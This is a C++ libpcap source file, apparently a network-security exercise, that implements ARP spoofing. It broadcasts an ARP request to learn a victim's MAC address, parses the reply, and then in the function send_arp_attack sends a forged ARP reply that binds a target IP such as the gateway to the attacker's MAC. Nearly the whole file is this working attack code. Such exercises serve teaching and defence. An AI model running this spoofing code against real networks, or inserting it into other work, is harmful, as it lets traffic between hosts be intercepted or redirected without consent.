#include "send-arp.h"

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void request_sender_mac(pcap_t* handle, uint8_t* my_mac, uint32_t my_ip, uint32_t sender_ip) {
        EthArp packet;

        memset(packet.eth_.dmac_, 0xFF, 6);
        memcpy(packet.eth_.smac_, my_mac, 6);
        packet.eth_.type_ = htons(EthHdr::ARP);

        packet.arp_.hrd_ = htons(ArpHdr::ETHERNET);
        packet.arp_.pro_ = htons(EthHdr::IP4);
        packet.arp_.hlen_ = 0x06;
        packet.arp_.plen_ = 0x04;
        packet.arp_.op_ = htons(ArpHdr::REQUEST);
        memcpy(packet.arp_.smac_, my_mac, 6);
        packet.arp_.sip_ = my_ip;
        memset(packet.arp_.dmac_, 0x00, 6);
        packet.arp_.dip_ = sender_ip;

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArp));
        if (res != 0) {
            fprintf(stderr, "request sender mac packet return %d error=%s\n", res, pcap_geterr(handle));
        }
}

bool analysis_sender_mac(pcap_t* handle, uint32_t my_ip, uint32_t sender_ip, uint8_t* sender_mac) {
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res < 0) return false;

        // 1. ARP 패킷인지 확인
        struct EthHdr* eth_hdr = (struct EthHdr*)packet;
        if (ntohs(eth_hdr->type_) != EthHdr::ARP) {
            printf("(Not an ARP packet, skipping.)\n");
            continue; 
        }

        struct ArpHdr* arp_hdr = (struct ArpHdr*)(packet + sizeof(EthHdr));

        // 2. 내가 찾던 ARP Reply인지 확인
        if (ntohs(arp_hdr->op_) == ArpHdr::REPLY && arp_hdr->sip_ == sender_ip) {
            memcpy(sender_mac, arp_hdr->smac_, 6);
            return true; 
        }
    }
    return false;
}

void send_arp_attack(pcap_t* handle, uint8_t* sender_mac, uint32_t sender_ip, uint32_t target_ip, uint8_t* my_mac) {
    EthArp packet;

    memcpy(packet.eth_.dmac_, sender_mac, 6);
    memcpy(packet.eth_.smac_, my_mac, 6);
    packet.eth_.type_ = htons(EthHdr::ARP);

    packet.arp_.hrd_ = htons(ArpHdr::ETHERNET);
    packet.arp_.pro_ = htons(EthHdr::IP4);
    packet.arp_.hlen_ = 0x06;
    packet.arp_.plen_ = 0x04;
    packet.arp_.op_ = htons(ArpHdr::REPLY);
    memcpy(packet.arp_.smac_, my_mac, 6);
    packet.arp_.sip_ = target_ip;
    memcpy(packet.arp_.dmac_, sender_mac, 6);
    packet.arp_.dip_ = sender_ip;

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArp));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}